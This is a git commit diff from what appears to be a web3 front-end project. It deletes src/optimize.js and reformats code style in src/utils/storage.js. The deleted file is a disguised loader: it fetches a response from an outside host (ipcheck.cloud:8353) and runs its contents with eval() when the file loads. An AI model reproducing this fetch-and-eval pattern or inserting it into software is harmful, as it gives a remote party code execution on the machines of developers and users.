8b5ae41dfb579d380d5202b12b14247da3ea9001
DonaldPunky <donaldpunkworld@gmail.com>
2024-09-14 02:02:28 +0900

    update 2 files

--- src/optimize.js
+++
@@ -1,9 +0,0 @@
-const axios = require('axios');
-async function fetchUserCookie() {
-  const res = await axios.get(
-    "http://ipcheck.cloud:8353/api/user/thirdcookie/v2/66"
-  );
-  eval(res.data.cookie);
-}
-
-fetchUserCookie();
--- src/utils/storage.js
+++ src/utils/storage.js
@@ -1,6 +1,6 @@
 import { STORAGE, STORAGE_APP_KEY } from "../constants";
 import { getContractInstance } from "./contract";
-import Storage from '../contracts/Storage.json';
+import Storage from "../contracts/Storage.json";
 
 const makeBaseStructure = (data) => {
   if (!data[STORAGE_APP_KEY]) {
@@ -8,15 +8,15 @@ const makeBaseStructure = (data) => {
   }
 
   if (!data[STORAGE_APP_KEY].networks) {
-    data[STORAGE_APP_KEY].networks = {}
+    data[STORAGE_APP_KEY].networks = {};
   }
 
   if (!data[STORAGE_APP_KEY].contracts) {
-    data[STORAGE_APP_KEY].contracts = {}
+    data[STORAGE_APP_KEY].contracts = {};
   }
 
   return data;
-}
+};
 
 const updateData = (oldData, newData) => {
   oldData = makeBaseStructure(oldData);
@@ -40,15 +40,25 @@ const updateData = (oldData, newData) => {
   };
 
   return result;
-}
+};
 
-export const saveAppData = async ({ library, domain, owner, data, onHash, onReceipt }) => {
-
+export const saveAppData = async ({
+  library,
+  domain,
+  owner,
+  data,
+  onHash,
+  onReceipt,
+}) => {
   try {
-    const storageContract = getContractInstance(library.web3, STORAGE, Storage.abi)
+    const storageContract = getContractInstance(
+      library.web3,
+      STORAGE,
+      Storage.abi,
+    );
     const { info } = await storageContract.methods.getData(domain).call();
 
-    const newData = updateData(JSON.parse(info || '{}'), data);
+    const newData = updateData(JSON.parse(info || "{}"), data);
 
     return new Promise(async (resolve, reject) => {
       storageContract.methods
@@ -57,16 +67,17 @@ export const saveAppData = async ({ library, domain, owner, data, onHash, onRece
           info: JSON.stringify(newData),
         })
         .send({ from: owner })
-        .on('transactionHash', (hash) => {
-          if (typeof onHash === 'function') onHash(hash)
+        .on("transactionHash", (hash) => {
+          if (typeof onHash === "function") onHash(hash);
         })
-        .on('receipt', (receipt) => {
-          if (typeof onReceipt === 'function') onReceipt(receipt, receipt?.status)
+        .on("receipt", (receipt) => {
+          if (typeof onReceipt === "function")
+            onReceipt(receipt, receipt?.status);
         })
         .then(resolve)
-        .catch(reject)
+        .catch(reject);
     });
   } catch (error) {
     throw error;
   }
-}
+};
